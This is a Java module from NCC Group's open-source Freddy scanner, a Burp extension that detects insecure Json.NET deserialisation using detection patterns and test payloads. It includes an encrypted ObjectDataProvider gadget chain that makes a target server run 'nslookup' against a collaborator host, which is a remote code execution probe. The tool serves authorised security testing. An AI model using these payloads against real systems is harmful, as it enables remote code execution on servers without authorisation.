// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.dotnet;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the .NET FastJson library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class JsonDotNetModule extends FreddyModuleBase {
    //ObjectDataProvider payload data
    private final String OBJD_PREFIX = decrypt("WccOiThTVc6eoJDoTj/xUQDIMTGo7qyxhMAAqvorhWkwHoToEWW+usdiKTnzCyyNle2HiHo1hRCtAGAaMeIerHeXwB3up4vR7WTcVhhEeWiSq4vEeRaA+rh+emdLeTLnCm6t5Nsy5LmYF8haDbuo9p7hsbKc7D4uUd5m+o7a0jS6xdBWER7e7/Ja+HeqyOVs9kQwfS7BgsBMoJw2gk9VSAPNGHDh6MBgP5oU/I3iofMbI2HwXDXtXjBBjXfabgBDdpFnylvTFL/Z3Ht0qP1EqJom8+Eakp5wHuc5AE8hXdr7WXmhfUbwoaFoatHV4KwLc70L1UCMzflcRuTj+wigdMPatZZdDx2xfI9bEVrTn6ZdryOUqJiqkAv3JizgBD2j1GbSyKUcvyOSvnR7s5aOiq6OeyZfvh2yB53BZxIQG4G4BsGQGFnUAmKE53T8sCuz");
    private final String OBJD_SUFFIX = decrypt("3YyuJEkwPnROLRUh1ys3DFUhq4DXoJYxBBoIs/JLUmolOpOYOEHsUgNuA75D3m9Mzzm5sMH3aF0v9XnwffGDb7L5hxKkK0lYLmIveSqdjIG2Kvprjc6N0vgnZk6wao2etZSePG18LTjI55EOntXu0Brx3oczhJ0bsBmMF0vL3YsDZl8KBlJiXaYeoQ+ij3k1");

    protected void initialiseModule() {
        setName("Json.NET");
        setPlatform(TargetPlatform.DOTNET);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        registerPassiveScanIndicator(Pattern.compile("((\")|(%22))((\\$)|(%24))type((\")|(%22))"), IndicatorTarget.REQUEST);
        registerPassiveScanIndicator("Newtonsoft.Json.", IndicatorTarget.RESPONSE);

        //Register false positive so passive scan issues don't fire for FastJson
        registerPassiveScanFalsePositiveIndicator(Pattern.compile("((\")|(%22))((\\$)|(%24))types((\")|(%22))"), IndicatorTarget.REQUEST);

        registerActiveScanExceptionPayload("{\"$type\":\"\"}", "JsonConvert.DeserializeObject");

        registerActiveScanCollaboratorPayload(PN_OBJDATPRO, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_OBJDATPRO:
                return OBJD_PREFIX + "nslookup " + hostname + OBJD_SUFFIX;
        }
        return null;
    }
}
